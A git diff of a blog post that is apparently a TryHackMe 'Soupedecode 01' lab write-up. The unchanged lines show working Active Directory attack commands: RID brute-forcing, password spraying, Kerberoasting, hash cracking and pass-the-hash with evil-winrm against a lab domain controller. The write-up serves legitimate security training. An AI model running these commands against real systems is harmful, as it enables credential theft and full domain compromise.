@@ -1,4 +1,10 @@
-# TryHackMe - Soupedecode 01 Walkthrough
+---
+title: "TryHackMe: Soupedecode 01 Walkthrough"
+categories: [Writeups]
+tags: [Writeups, TryHackMe]
+image:
+  path: assets/img/posts/tryhackme/soupedecode-01/618b3fa52f0acc0061fb0172-1753465052754.png
+---
 
 ![image.png](image.png)
 
@@ -51,7 +57,7 @@ smbclient -L 10.65.148.96 -N
 
 **Results**
 
-![image.png](image%201.png)
+![image.png](assets/img/posts/tryhackme/soupedecode-01/image%201.png)
 
 The output revealed multiple shares, including **NETLOGON** and **SYSVOL**, confirming that this system is a Domain Controller.
 
@@ -59,7 +65,7 @@ However, attempts to list the contents of the shares resulted in *access denied*
 
 This suggested that anonymous access was partially enabled but restricted.
 
-![image.png](image%202.png)
+![image.png](assets/img/posts/tryhackme/soupedecode-01/image%202.png)
 
 ### LDAP Enumeration
 
@@ -73,7 +79,7 @@ ldapsearch -x -H ldap://10.65.148.96 -s base
 
 Further LDAP enumeration was not possible, indicating that **anonymous LDAP bind is disabled**.
 
-![image.png](image%203.png)
+![image.png](assets/img/posts/tryhackme/soupedecode-01/image%203.png)
 
 Since none of the attack vectors (using null sessions or anonymous)was working i opted for an automated tool - `enum4linux-ng`
 
@@ -118,7 +124,7 @@ crackmapexec smb 10.65.148.96 -u 'guest' -p '' --rid-brute
 
 As a result, I successfully obtained a list of **domain usernames**.
 
-![image.png](image%204.png)
+![image.png](assets/img/posts/tryhackme/soupedecode-01/image%204.png)
 
 ## **User Enumeration & Password Spraying**
 
@@ -132,7 +138,7 @@ Since no password hints were provided and large wordlists would be noisy, I perf
 ./kerbrute passwordspray -d SOUPEDECODE.LOCAL --dc 10.65.148.96 valid_users.txt --user-as-pass
 ```
 
-![image.png](image%205.png)
+![image.png](assets/img/posts/tryhackme/soupedecode-01/image%205.png)
 
 This resulted in a valid credential:
 
@@ -150,11 +156,11 @@ smbclient //10.65.148.96/Users -U 'ybob317%ybob317'
 
 **Results**
 
-![image.png](image%206.png)
+![image.png](assets/img/posts/tryhackme/soupedecode-01/image%206.png)
 
 Navigating through the share I was able to retrieve the user flag
 
-![image.png](image%207.png)
+![image.png](assets/img/posts/tryhackme/soupedecode-01/image%207.png)
 
 ## Kerberoasting
 
@@ -166,7 +172,7 @@ I performed Kerberoasting using Impacket:
 impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.65.148.96 -request -outputfile hashes.txt
 ```
 
-![image.png](image%208.png)
+![image.png](assets/img/posts/tryhackme/soupedecode-01/image%208.png)
 
 The hash for the `file_svc` service account was extracted and cracked using Hashcat:
 
@@ -186,13 +192,13 @@ The credentials were validated successfully:
 crackmapexec smb 10.65.148.96 -u file_svc -p 'Password123!!'
 ```
 
-![image.png](image%209.png)
+![image.png](assets/img/posts/tryhackme/soupedecode-01/image%209.png)
 
 ## Lateral Movement & Credential Dump
 
 Re-enumerating SMB shares using the `file_svc` account revealed a file named `backup_extract.txt`.
 
-![image.png](image%2010.png)
+![image.png](assets/img/posts/tryhackme/soupedecode-01/image%2010.png)
 
 This file contained **NTLM hashes for multiple computer accounts** within the domain:
 
@@ -219,7 +225,7 @@ nxc smb 10.65.148.96 -u account_names.txt -H account_hashes.txt --continue-on-su
 
 This resulted in a successful authentication using the following account:
 
-![image.png](image%2011.png)
+![image.png](assets/img/posts/tryhackme/soupedecode-01/image%2011.png)
 
 Since the `FileServer$` computer account is a **local administrator** on the Domain Controller, I used Pass-the-Hash to establish a session via Evil-WinRM:
 
@@ -229,4 +235,4 @@ evil-winrm -i 10.65.148.96 -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559
 
 This granted administrative access, allowing me to retrieve the **root.txt** flag and fully compromise the system
 
-![image.png](image%2012.png)
+![image.png](assets/img/posts/tryhackme/soupedecode-01/image%2012.png)
